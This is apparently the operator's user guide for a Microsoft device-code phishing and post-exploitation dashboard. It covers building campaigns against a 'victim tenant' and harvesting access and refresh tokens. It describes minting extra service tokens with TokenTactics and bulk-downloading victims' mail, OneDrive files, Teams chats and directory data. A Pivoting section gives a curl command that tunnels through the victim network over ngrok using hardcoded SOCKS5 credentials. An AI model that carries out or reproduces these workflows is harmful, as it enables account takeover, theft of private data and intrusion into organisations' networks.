# User Guide

Sign in at `/login` with the admin access key (`config/secret.key` on first
boot). Every page is operator-facing; the victim only ever sees the Microsoft
device-login page.

## Dashboard

Stat cards (active campaigns, devices, tokens acquired, targets), a live
device feed (online dot, Token/Admin/Tunnel badges; click a row for device
detail), recent campaigns and the last 20 events.

## Campaigns

Campaign workflow:

1. **Create**: name, target domain (the *victim tenant's real domain*, e.g.
   `corp.com`; foreign domains fail at mint time with `AADSTS50020`),
   optional auth site / post-auth URL overrides.
2. **Targets**: add one by one (`hostname[,upn[,note]]`) or bulk import
   (one per line, `#` comments allowed). Status moves
   *pending → registered → authenticated* automatically.
3. **Launch**: stamps `launched_at`; devices can link either way.
4. **Deployment**: download the campaign's `client.json` (attachment) and
   copy the `?h=HOSTNAME&c=TOKEN` registration URL. `ngrok_token` comes
   from the global Settings; if unset there it stays `null` and the
   operator's own client config value applies.

Any client started with the campaign token auto-links on registration or on
its next 30 s health check.

## Devices

All connected devices: hostname (click = detail), user identity, campaign,
online status, last seen, tunnel URL (copy button) and the **Actions** menu
(fixed-position dropdown, never clipped):

- Device details
- Token scopes · Generate Teams token · Teams messages · Message status ·
  Download Teams data (each enabled only when its prerequisite token exists)
- Delete device (keeps logs for audit)

## Device detail

The operator workbench for one device:

- **Identity / Connection / Token status**: user, UPN, IP, device code,
  tunnel URL, token expiry, raw access/refresh token viewing.
- **Permission Analysis**: scope chips (`.ReadWrite` highlighted amber) and
  role chips parsed from the access token; admin badge when elevated scopes
  are present.
- **TokenTactics Service Tokens**: 14 services. **★ Recommended** entries
  are derived from the permission analysis (e.g. admin privileges → Azure
  Management). Buttons: Mint / Refresh / **JWT** (claims + raw token modal).
- **Data Viewer**: pick a service chip, pick a resource, then:
  - **Fetch First N** (default 25): single page, flags *more available*
  - **Fetch All**: follows `@odata.nextLink` pages (max 5000 records)
  - rendered tables per resource (mail: from/subject/date/preview; users:
    name/UPN/title; …), JSON copy/download, raw-text view for Teams output
  - resources appear automatically as soon as their token is minted; no
    page reload
- **Device Logs**: last 50 events for this device.

Available resources per service (TokenTactics minting + direct REST):

| Service | Resources |
|---|---|
| MS Graph | Profile, Mail, Directory Users, Groups, Calendar, OneDrive, Teams Chats, SharePoint Sites |
| Outlook | Profile, Mail, Calendar, Contacts, Mail Folders |
| SharePoint | Sites (tenant `_api/search`) |
| Azure Mgmt / Core | Subscriptions |
| AAD Graph | Profile, Tenant Details |
| Teams | Messages (pwsh async cache) |
| Yammer | Messages |

## Settings

Global fallbacks written to `config/server.json`: target domain (used by
devices without a campaign-specific domain), default auth site / post-auth
URL, ngrok token (embedded into campaign client-config downloads). The
config cache resets on save; no restart needed.

## Logs

Paginated (50/page) searchable event stream across all devices.

## Pivoting

With the tunnel registered, connect from anywhere through the victim:

```bash
curl --socks5-hostname 2.tcp.ngrok.io:PORT -U OPERATOR:SecureProxy123 http://ifconfig.me
```

The response shows the **victim network's** egress IP. Wrong credentials are
rejected by the SOCKS5 layer.

The default credentials (`OPERATOR:SecureProxy123`) are baked into the client
at `src/client/tunnel.py`; edit them there **before building the client
binary** if you want your own; the SOCKS5 layer accepts nothing else.

## References

- AADInternals: <https://github.com/Gerenios/AADInternals>
- AADInternals phishing: <https://aadinternals.com/post/phishing/>
- TokenTactics: <https://github.com/rvrsh3ll/TokenTactics> (vendored, v0.0.2)
